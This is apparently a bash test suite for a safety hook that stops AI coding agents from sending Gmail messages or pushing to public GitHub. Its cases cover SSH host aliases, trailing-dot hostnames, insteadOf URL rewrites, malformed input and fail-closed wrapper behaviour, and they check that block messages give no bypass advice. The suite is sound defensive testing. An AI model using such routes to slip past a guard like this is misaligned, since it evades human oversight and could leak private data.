check "J4-05 gh api fields without -X to <public> (deny)" deny "$(shelljson "$TN" 'gh api repos/octocat/Hello-World/issues -f title=x')"

echo "== guard ($IMPL): input shape"
check "empty stdin (deny)" deny ''
check "whitespace-only stdin (deny)" deny $'  \n'
check "empty object {} (deny)" deny '{}'
check "no tool_name (deny)" deny '{"tool_input":{"command":"ls"}}'
check "not JSON at all (deny)" deny 'hello'
check "malformed JSON gmail send (deny)" deny '{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{'
check "BOM-prefixed JSON gmail send (deny)" deny $'\xef\xbb\xbf{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{}}'

echo "== guard ($IMPL): GitHub SSH alias (from ~/.ssh/config)"
if [ "$IMPL" = ps ] && [ -n "$WIN" ]; then
  skip "SSH alias cases" "PowerShell on Windows runs the system ssh.exe, which can't be pointed at a test ssh config"
elif ! command -v ssh >/dev/null 2>&1; then
  skip "SSH alias cases" "no ssh client"
else
  mkdir -p "$T/bin"
  printf 'Host github-work\n  HostName github.com\n  User git\nHost github-dot\n  HostName github.com.\nHost myserver\n  HostName example.com\n' > "$T/sshconfig"
  printf '#!/bin/sh\nexec "%s" -F "%s" "$@"\n' "$(command -v ssh)" "$T/sshconfig" > "$T/bin/ssh"; chmod +x "$T/bin/ssh"
  OLDPATH="$PATH"; export PATH="$T/bin:$PATH"
  mk alias "git@github-work:octocat/Hello-World.git"
  mk aliasurl "ssh://git@github-work/octocat/Hello-World.git"
  mk aliaspriv "git@github-work:octocat/this-repo-does-not-exist-zz9.git"
  mk othersrv "git@myserver:me/jobs.git"
  mk localpath "$T/bare-local.git"
  mk aliasdot "git@github-dot:octocat/Hello-World.git"
  mk aliasdotpriv "git@github-dot:octocat/this-repo-does-not-exist-zz9.git"
  check "J3-05 SSH alias with HostName github.com. (trailing dot), public (deny)" deny "$(shelljson "$TN/aliasdot" "git $PU origin main")"
  check "J3-05 ok: SSH alias with trailing-dot HostName, private (allow)" allow "$(shelljson "$TN/aliasdotpriv" "git $PU origin main")"
  check "SSH alias for GitHub, public (deny)" deny "$(shelljson "$TN/alias" "git $PU origin main")"
  check "ssh:// alias for GitHub, public (deny)" deny "$(shelljson "$TN/aliasurl" "git $PU")"
  check "SSH alias for GitHub, private (allow)" allow "$(shelljson "$TN/aliaspriv" "git $PU origin main")"
  check "SSH alias for another server (allow)" allow "$(shelljson "$TN/othersrv" "git $PU origin main")"
  check "local folder remote (allow)" allow "$(shelljson "$TN/localpath" "git $PU origin main")"
  export PATH="$OLDPATH"
fi

echo "== guard ($IMPL): GitHub unreachable"
RUN="$RUN_OFF"
check "offline, git $PU to GitHub remote (deny unknown)" deny "$(shelljson "$TN/priv" "git $PU origin main")"
check "offline, git $PU to gitlab (allow, not checked)" allow "$(shelljson "$TN/other" "git $PU origin main")"
check "offline, Bash ls (allow)" allow "$(shelljson "$TN/pub" 'ls')"
RUN="$RUN_DEFAULT"

if [ "$IMPL" = ps ]; then
  echo "== guard.ps1: an unexpected error while checking"
  if grep -q '    # Shell: only git push' "$T/m/guard.ps1"; then
    "$PY" - "$T/m/guard.ps1" "$T/broken/guard.ps1" <<'PY'
import os, sys
s = open(sys.argv[1], encoding='utf-8').read()
k = '    # Shell: only git push'
os.makedirs(os.path.dirname(sys.argv[2]), exist_ok=True)
open(sys.argv[2], 'w', encoding='utf-8').write(s.replace(k, '    throw "boom"\n' + k, 1))
PY
    RUN="\"$PS\" $PSA -File \"$(native "$T/broken/guard.ps1")\""
    check "error, gmail search -> deny (risky tool)" deny '{"tool_name":"mcp__claude_ai_Gmail__search_threads","tool_input":{}}'
    check "error, WebFetch -> deny" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
    check "error, browser -> deny" deny '{"tool_name":"mcp__Claude_Browser__navigate","tool_input":{"url":"https://x.com"}}'
    check "error, Bash git $PU -> deny" deny "$(shelljson "$TN/pub" "git $PU")"
    check "error, Bash ls -> allow (not risky)" allow "$(shelljson "$TN/pub" 'ls')"
    check "error, interview tool -> allow (not risky)" allow '{"tool_name":"mcp__interview-room__interview_say","tool_input":{}}'
    RUN="$RUN_DEFAULT"
  else
    skip "error-injection cases" "the marker comment they hook into is gone from guard.ps1"
  fi
  check "PowerShell: Set-Location; git $PU, public (deny)" deny "$(shelljson "$TN" "Set-Location pub; git $PU" shell_command)"
fi

if [ "$IMPL" = sh ]; then
  echo "== fail-closed wrappers (.claude/settings.json, .codex/hooks.json)"
  hookcmd() { "$PY" -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["hooks"][sys.argv[2]][0]["hooks"][0][sys.argv[3]])' "$@"; }
  SC="$(hookcmd "$REPO/.claude/settings.json" PreToolUse command)"
  CC="$(hookcmd "$REPO/.codex/hooks.json" PreToolUse command)"
  mkdir -p "$T/proj/.claude/hooks"
  printf 'exit 3\n' > "$T/proj/.claude/hooks/guard.sh"
  RUN="$SC" check "settings.json cmd, guard exits 3 -> block" block2 '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
  printf 'if then fi\n' > "$T/proj/.claude/hooks/guard.sh"
  RUN="$SC" check "settings.json cmd, guard syntax error -> block" block2 '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
  cp "$T/m/guard.sh" "$T/proj/.claude/hooks/guard.sh"
  RUN="$SC" check "settings.json cmd, real guard, gmail search -> allow" allow '{"tool_name":"mcp__claude_ai_Gmail__search_threads","tool_input":{}}'
  RUN="$SC" check "settings.json cmd, real guard, gmail send -> deny" deny '{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{}}'
  RUN="$SC" check "settings.json cmd, real guard, git $PU public -> deny" deny "$(shelljson "$TN/pub" "git $PU")"
  rm "$T/proj/.claude/hooks/guard.sh"
  RUN="$SC" check "settings.json cmd, guard missing -> block" block2 '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
  mkdir -p "$T/cproj/.claude/hooks/sub" "$T/noagents" && touch "$T/cproj/AGENTS.md" && cp "$T/m/guard.sh" "$T/cproj/.claude/hooks/guard.sh"
  # Without CLAUDE_PROJECT_DIR (another app reading Claude's hooks) the command uses the current folder's guard:
  # none there -> block; the real one there -> it decides.
  RUN="set +u; unset CLAUDE_PROJECT_DIR; cd \"$T/noagents\" && $SC" check "settings.json cmd, CLAUDE_PROJECT_DIR unset, no guard here -> block" block2 '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
  RUN="set +u; unset CLAUDE_PROJECT_DIR; cd \"$T/cproj\" && $SC" check "settings.json cmd, CLAUDE_PROJECT_DIR unset, real guard here, gmail send -> deny" deny '{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{}}'
  RUN="cd \"$T/cproj/.claude/hooks/sub\" && $CC" check "codex cmd from a subfolder, gmail send -> block" block2 '{"tool_name":"mcp__gmail__send_email","tool_input":{}}'
  if grep -q 'only reads job email' "$T/stderr.txt" && ! grep -q 'could not run' "$T/stderr.txt"; then pass=$((pass + 1)); echo "PASS  codex cmd block gives the guard's own reason on stderr"
  else fail=$((fail + 1)); echo "FAIL  codex cmd block reason: $(head -c 300 "$T/stderr.txt")"; fi
  # Codex runs hooks in a login shell; text a shell profile prints must not hide the block.
  RUN="echo 'Welcome back from .zprofile'; cd \"$T/cproj/.claude/hooks/sub\" && $CC" check "codex cmd with profile noise on stdout, send -> block" block2 '{"tool_name":"mcp__gmail__send_email","tool_input":{}}'
  RUN="cd \"$T/cproj/.claude/hooks/sub\" && $CC" check "codex cmd from a subfolder, gmail search -> allow" allow '{"tool_name":"mcp__gmail__search_emails","tool_input":{}}'
  if command -v fish >/dev/null 2>&1; then
    RUN="cd \"$T/cproj\" && fish -c $(printf '%q' "$CC")" check "codex cmd under fish, send -> block" block2 '{"tool_name":"mcp__gmail__send_email","tool_input":{}}'
  else skip "codex cmd under fish" "fish is not installed"; fi
  rm "$T/cproj/.claude/hooks/guard.sh"
  RUN="cd \"$T/cproj\" && $CC" check "codex cmd, guard missing -> block" block2 '{"tool_name":"mcp__gmail__search","tool_input":{}}'
  RUN="cd \"$T/noagents\" && $CC" check "codex cmd, no AGENTS.md found -> block" block2 '{"tool_name":"mcp__gmail__search","tool_input":{}}'
  RUN="$RUN_DEFAULT"

  echo "== .githooks/pre-push"
  H="$T/m/hooks/pre-push"
  if [ -n "$WIN" ] || [ -x "$PREPUSH" ]; then pass=$((pass + 1)); echo "PASS  pre-push is executable"
  else fail=$((fail + 1)); echo "FAIL  pre-push is not executable (git won't run it)"; fi
  pp() { # pp <name> <expected exit> <repo dir> <remote> [hook]
    local rc; (cd "$T/$3" && printf '' | bash "${5:-$H}" "$4" "$(git remote get-url "$4")" >"$T/ppout" 2>&1); rc=$?
    if [ "$rc" = "$2" ]; then pass=$((pass + 1)); printf 'PASS  %-62s exit %s\n' "$1" "$rc"
    else fail=$((fail + 1)); printf 'FAIL  %-62s expected %s got %s\n' "$1" "$2" "$rc"; sed 's/^/      | /' "$T/ppout"; fi
  }
  pp "pre-push, public GitHub (block)" 1 pub origin
  pp "pre-push, public GitHub via ssh URL (block)" 1 sshpub origin
  pp "pre-push, private/missing GitHub (allow)" 0 priv origin
  pp "pre-push, GitHub answers 500 (block)" 1 err origin
  pp "pre-push, gitlab (allow)" 0 other origin
  pp "pre-push, GitHub unreachable (block)" 1 priv origin "$T/off/pre-push"
  if grep -q 'no-verify' "$T/ppout"; then fail=$((fail + 1)); echo "FAIL  pre-push unreachable message suggests bypassing the check"
  else pass=$((pass + 1)); echo "PASS  pre-push unreachable message gives no bypass advice"; fi
  if [ -d "$T/alias" ]; then
    export PATH="$T/bin:$PATH"
    pp "pre-push, SSH alias for GitHub, public (block)" 1 alias origin
    pp "pre-push, SSH alias, private (allow)" 0 aliaspriv origin
    pp "pre-push, SSH alias for another server (allow)" 0 othersrv origin
    pp "pre-push, local folder remote (allow)" 0 localpath origin
    pp "J3-05 pre-push, SSH alias with trailing-dot HostName, public (block)" 1 aliasdot origin
    pp "J3-05 pre-push, SSH alias with trailing-dot HostName, private (allow)" 0 aliasdotpriv origin
    export PATH="$OLDPATH"
  fi
  # End to end through git itself (core.hooksPath), pushing only to local bare repos.
  git -C "$T" init -q --bare bare.git
  mkdir -p "$T/fake/github.com/octocat" && git -C "$T/fake/github.com/octocat" init -q --bare Hello-World.git
  for r in pub priv; do
    git -C "$T/$r" config core.hooksPath "$TN/m/hooks"
    git -C "$T/$r" commit -q --allow-empty -m init
  done
  # git hands the hook the push URL: a local path that looks like github.com/octocat/Hello-World (public).
  git -C "$T/pub" config remote.origin.pushurl "$TN/fake/github.com/octocat/Hello-World.git"
  git -C "$T/priv" config remote.origin.pushurl "$TN/bare.git"
  if git -C "$T/pub" "$PU" -q origin HEAD:refs/heads/x >"$T/e2e" 2>&1; then fail=$((fail + 1)); echo "FAIL  e2e: git $PU to a public repository was not stopped"
  elif grep -q 'PUBLIC' "$T/e2e"; then pass=$((pass + 1)); echo "PASS  e2e: real git $PU to public GitHub stopped by pre-push"
  else fail=$((fail + 1)); echo "FAIL  e2e: failed, but not because of the hook:"; sed 's/^/      | /' "$T/e2e"; fi
  if git -C "$T/priv" "$PU" -q origin HEAD:refs/heads/x >"$T/e2e2" 2>&1; then pass=$((pass + 1)); echo "PASS  e2e: real git $PU to a non-GitHub (local) URL allowed"
  else fail=$((fail + 1)); echo "FAIL  e2e: allowed case failed"; sed 's/^/      | /' "$T/e2e2"; fi
  # A saved insteadOf rewrite: git hands the hook the rewritten (public-looking) URL, not the word typed.
  git -C "$T/priv" config "url.$TN/fake/github.com/octocat/Hello-World.git.insteadOf" reviewdest
  git -C "$T/priv" config core.hooksPath "$TN/m/hooks"
  if git -C "$T/priv" "$PU" -q reviewdest HEAD:refs/heads/y >"$T/e2e3" 2>&1; then fail=$((fail + 1)); echo "FAIL  e2e: git $PU through a saved insteadOf rewrite to a public repository was not stopped"
  elif grep -q 'PUBLIC' "$T/e2e3"; then pass=$((pass + 1)); echo "PASS  e2e: J5-04 saved insteadOf rewrite to public GitHub stopped by pre-push"
  else fail=$((fail + 1)); echo "FAIL  e2e: insteadOf case failed, but not because of the hook:"; sed 's/^/      | /' "$T/e2e3"; fi
  git -C "$T/priv" config --unset "url.$TN/fake/github.com/octocat/Hello-World.git.insteadOf"

  echo "== .githooks/commit-msg"
  CM="$REPO/.githooks/commit-msg"
  if [ -n "$WIN" ] || [ -x "$CM" ]; then pass=$((pass + 1)); echo "PASS  commit-msg is executable"
  else fail=$((fail + 1)); echo "FAIL  commit-msg is not executable (git won't run it)"; fi
  cmcheck() { # cmcheck <name> <message> <expected message>
    printf '%s' "$2" > "$T/cmsg"; bash "$CM" "$T/cmsg"; local rc=$?
    if [ "$rc" = 0 ] && [ "$(cat "$T/cmsg")" = "$3" ]; then pass=$((pass + 1)); printf 'PASS  %s\n' "$1"
    else fail=$((fail + 1)); printf 'FAIL  %s (rc=%s)\n      got: %s\n' "$1" "$rc" "$(tr '\n' '|' < "$T/cmsg")"; fi
  }
  cmcheck "commit-msg strips Claude and Codex trailers" $'Fix the tracker\n\nCo-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>\nCo-authored-by: Codex <codex@openai.com>\n' 'Fix the tracker'
  cmcheck "commit-msg strips session link and Generated-with line" $'Add a page\n\nBody text.\n\n\xf0\x9f\xa4\x96 Generated with [Claude Code](https://claude.com/claude-code)\nClaude-Session: https://claude.ai/code/x\n' $'Add a page\n\nBody text.'
  cmcheck "commit-msg keeps a person's Co-authored-by" $'Pair work\n\nCo-authored-by: Alex Rivera <alex@example.com>\n' $'Pair work\n\nCo-authored-by: Alex Rivera <alex@example.com>'
  cmcheck "commit-msg leaves a plain message alone" $'Just a message\n' 'Just a message'
  # End to end: git runs it through core.hooksPath.
  git -C "$T/priv" config core.hooksPath "$(native "$REPO")/.githooks"
  git -C "$T/priv" commit -q --allow-empty -m $'Update notes\n\nCo-Authored-By: Claude <noreply@anthropic.com>' >/dev/null 2>&1
  if [ "$(git -C "$T/priv" log -1 --format=%B | sed '/^$/d')" = "Update notes" ]; then pass=$((pass + 1)); echo "PASS  e2e: git commit through core.hooksPath drops the AI trailer"
  else fail=$((fail + 1)); echo "FAIL  e2e: commit message kept: $(git -C "$T/priv" log -1 --format=%B | tr '\n' '|')"; fi
fi

if [ "$IMPL" = ps ]; then
  echo "== Codex Windows wrappers (base64 commandWindows in .codex/hooks.json)"
  enc() { "$PY" -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["hooks"][sys.argv[2]][0]["hooks"][0]["commandWindows"].split("-EncodedCommand ")[1].strip())' "$REPO/.codex/hooks.json" "$1"; }
  EPT="$(enc PreToolUse)"; ESS="$(enc SessionStart)"; EAW="$(enc PostToolUse)"
  W="$T/wrap"; mkdir -p "$W/proj/.claude/hooks" "$W/proj/sub/deeper" "$W/noagents"; touch "$W/proj/AGENTS.md"
  wrun() { # wrun <name> <expected rc> <deny|allow|-> <cwd> <encoded> <stdin>
    local out rc got=allow
    out="$(cd "$4" && printf '%s' "$6" | "$PS" -NoProfile -NonInteractive -EncodedCommand "$5" 2>"$T/stderr.txt")"; rc=$?
    printf '%s' "$out" | grep -qE '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' && got=deny
    if [ "$rc" = "$2" ] && { [ "$3" = - ] || [ "$got" = "$3" ]; }; then pass=$((pass + 1)); printf 'PASS  %-62s rc=%s %s\n' "$1" "$rc" "$got"
    else fail=$((fail + 1)); printf 'FAIL  %-62s rc=%s %s (want rc=%s %s)\n      out=%s\n      err=%s\n' "$1" "$rc" "$got" "$2" "$3" "$out" "$(head -c 600 "$T/stderr.txt")"; fi
  }
  SEND='{"tool_name":"mcp__gmail__send_email","tool_input":{}}'
  SEARCH='{"tool_name":"mcp__gmail__search_emails","tool_input":{}}'
  cp "$T/m/guard.ps1" "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, root cwd, gmail send -> deny" 0 deny "$W/proj" "$EPT" "$SEND"
  wrun "PreToolUse wrapper, nested cwd, gmail send -> deny" 0 deny "$W/proj/sub/deeper" "$EPT" "$SEND"
  wrun "PreToolUse wrapper, gmail search -> allow" 0 allow "$W/proj/sub" "$EPT" "$SEARCH"
  BIG="$("$PY" -c 'import json; print(json.dumps({"tool_name":"mcp__gmail__send_email","tool_input":{"body":"x"*200000}}))')"
  wrun "PreToolUse wrapper, 200KB input, send -> deny" 0 deny "$W/proj" "$EPT" "$BIG"
  printf 'exit 3\n' > "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard exits 3 -> block (exit 2)" 2 - "$W/proj" "$EPT" "$SEARCH"
  printf 'if ( {\n' > "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard syntax error -> block (exit 2)" 2 - "$W/proj" "$EPT" "$SEARCH"
  printf 'throw "x"\n' > "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard throws -> block (exit 2)" 2 - "$W/proj" "$EPT" "$SEARCH"
  printf '[Console]::In.ReadToEnd() | Out-Null\n' > "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard with no explicit exit -> block" 2 - "$W/proj" "$EPT" "$SEARCH"
  rm "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard missing -> block (exit 2)" 2 - "$W/proj" "$EPT" "$SEARCH"
  wrun "PreToolUse wrapper, no AGENTS.md anywhere -> block" 2 - "$W/noagents" "$EPT" "$SEARCH"
  if grep -q 'Safety check could not run' "$T/stderr.txt"; then pass=$((pass + 1)); echo "PASS  block message on stderr"
  else fail=$((fail + 1)); echo "FAIL  no block message on stderr"; fi
  # SessionStart / PostToolUse wrappers: they find the workspace from a subfolder and never block.
  cp "$REPO/.claude/hooks/session-start.ps1" "$REPO/.claude/hooks/after-write.ps1" "$W/proj/.claude/hooks/"
  mkdir -p "$W/proj/jobs/acme-role"
  out="$(cd "$W/proj/jobs/acme-role" && printf '{}' | "$PS" -NoProfile -NonInteractive -EncodedCommand "$ESS" 2>"$T/stderr.txt")"; rc=$?
  if [ "$rc" = 0 ] && printf '%s' "$out" | grep -q '"SessionStart"'; then pass=$((pass + 1)); echo "PASS  SessionStart wrapper from a subfolder, fresh workspace (no user files)"
  else fail=$((fail + 1)); printf 'FAIL  SessionStart wrapper rc=%s\n      out=%s\n      err=%s\n' "$rc" "$out" "$(head -c 600 "$T/stderr.txt")"; fi
  out="$(cd "$W/proj/jobs/acme-role" && printf '%s' '{"tool_name":"apply_patch","tool_input":{"command":"*** Begin Patch\n*** Update File: jobs/tracker.csv\n*** End Patch"}}' | "$PS" -NoProfile -NonInteractive -EncodedCommand "$EAW" 2>"$T/stderr.txt")"; rc=$?
  if [ "$rc" = 0 ]; then pass=$((pass + 1)); echo "PASS  PostToolUse wrapper from a subfolder exits 0"
  else fail=$((fail + 1)); printf 'FAIL  PostToolUse wrapper rc=%s\n      out=%s\n      err=%s\n' "$rc" "$out" "$(head -c 600 "$T/stderr.txt")"; fi
  out="$(cd "$W/noagents" && printf '{}' | "$PS" -NoProfile -NonInteractive -EncodedCommand "$ESS" 2>&1)"; rc=$?
  if [ "$rc" = 0 ] && [ -z "$out" ]; then pass=$((pass + 1)); echo "PASS  SessionStart wrapper, no AGENTS.md: quiet exit 0"
  else fail=$((fail + 1)); echo "FAIL  SessionStart wrapper, no AGENTS.md: rc=$rc out=$out"; fi
fi

echo
echo "guard fixtures ($IMPL): passed $pass, failed $fail, skipped $skipped"
[ "$fail" -eq 0 ]
